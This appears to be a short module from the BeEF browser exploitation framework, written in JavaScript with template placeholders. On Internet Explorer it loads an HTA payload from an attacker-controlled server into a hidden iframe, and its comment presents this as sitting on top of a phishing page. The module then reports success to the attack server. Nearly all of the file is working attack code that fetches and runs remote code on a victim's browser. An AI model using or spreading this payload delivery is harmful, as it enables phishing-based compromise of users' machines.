//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function(){

    var hta_url = '<%= @domain %>' + '<%= @ps_url %>' + '/hta';

    if (beef.browser.isIE()) {
        // application='yes' is IE-only and needed to load the HTA into an IFrame.
        // in this way you can have your phishing page, and load the HTA on top of it
        beef.dom.createIframe('hidden', {'src': hta_url, 'application': 'yes'});
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'HTA loaded into hidden IFrame.');
    }
});
